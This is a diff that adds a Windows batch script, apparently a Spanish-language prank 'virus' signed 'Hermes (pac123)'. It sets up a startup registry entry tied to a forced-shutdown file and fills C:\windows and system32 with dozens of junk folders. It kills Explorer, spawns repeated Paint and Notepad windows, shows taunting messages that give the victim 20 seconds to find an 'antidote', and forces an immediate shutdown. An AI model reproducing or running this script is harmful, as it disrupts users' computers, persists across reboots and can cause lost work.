@@ -1,0 +1,121 @@
+@echo off
+mkdir "C:\antidoto"
+cd c:\antidoto
+echo @echo off > virusSoyBorrame.bat
+echo shutdown -s -f -t 10 >> virusSoyBorrame.bat
+echo exit >> virusSoyBorrame.bat
+reg add hkey_local_machine\software\microsoft\windows\currentversion\run/v virusSoyBorrame.bat/t reg_sz /d C:\antidoto /f
+cd
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "C:\mch"
+mkdir "c:\mch"
+mkdir "c:\mch"
+mkdir "c:\mch"
+mkdir "c:\mch"
+mkdir "c:\mch"
+mkdir "c:\mch"
+mkdir "c:\mch"
+mkdir "c:\mch"
+mkdir "C:\windows\borrame1"
+mkdir "C:\windows\borrame2"
+mkdir "C:\windows\borrame3"
+mkdir "C:\windows\borrame4"
+mkdir "C:\windows\borrame5"
+mkdir "C:\windows\borrame6"
+mkdir "C:\windows\borrame7"
+mkdir "C:\windows\borrame8"
+mkdir "C:\windows\borrame9"
+mkdir "C:\windows\borrame0"
+mkdir "C:\windows\borrame11"
+mkdir "C:\windows\txshack1"
+mkdir "C:\windows\txshack2"
+mkdir "C:\windows\txshack3"
+mkdir "C:\windows\txshack4"
+mkdir "C:\windows\txshack5"
+mkdir "C:\windows\txshack6"
+mkdir "C:\windows\txshack7"
+mkdir "C:\windows\txshack8"
+mkdir "C:\windows\txshack9"
+mkdir "C:\windows\txshack0"
+mkdir "C:\windows\txshack09"
+mkdir "C:\windows\txshack08"
+mkdir "C:\windows\txshack07"
+mkdir "C:\windows\txshack06"
+mkdir "C:\windows\system32\mastrabajo1"
+mkdir "C:\windows\system32\mastrabajo2"
+mkdir "C:\windows\system32\mastrabajo3"
+mkdir "C:\windows\system32\mastrabajo4"
+mkdir "C:\windows\system32\mastrabajo5"
+mkdir "C:\windows\system32\mastrabajo6"
+mkdir "C:\windows\system32\mastrabajo7"
+mkdir "C:\windows\system32\mastrabajo8"
+mkdir "C:\windows\system32\mastrabajo9"
+mkdir "C:\windows\system32\mastrabajo0"
+mkdir "C:\windows\system32\mastrabajo00"
+mkdir "C:\windows\system32\mastrabajo99"
+mkdir "C:\windows\system32\mastrabajo88"
+mkdir "C:\windows\system32\mastrabajo77"
+mkdir "C:\windows\system32\mastrabajo66"
+mkdir "C:\windows\system32\mastrabajo55"
+msg * Adios al internet
+start tskill Explorer
+msg * Para mañana me teneis que traer una redaccion con un dibujo.
+start mspaint.exe
+start notepad.exe
+start mspaint.exe
+start notepad.exe
+start mspaint.exe
+start notepad.exe
+start mspaint.exe
+start notepad.exe
+start mspaint.exe
+start notepad.exe
+start mspaint.exe
+start notepad.exe
+start mspaint.exe
+start notepad.exe
+start mspaint.exe
+start notepad.exe
+start mspaint.exe
+start notepad.exe
+start mspaint.exe
+start notepad.exe
+start mspaint.exe
+start notepad.exe
+start mspaint.exe
+start notepad.exe
+msg * Hola, tienes 20 segundos para buscar el antidoto que soluciona el problema. Tienes 20 segundos ¡Animo!
+msg * ¡Suerte! By Hermes (pac123)  
+start www.google.es
+start shutdown -s -f -t 1
+exit
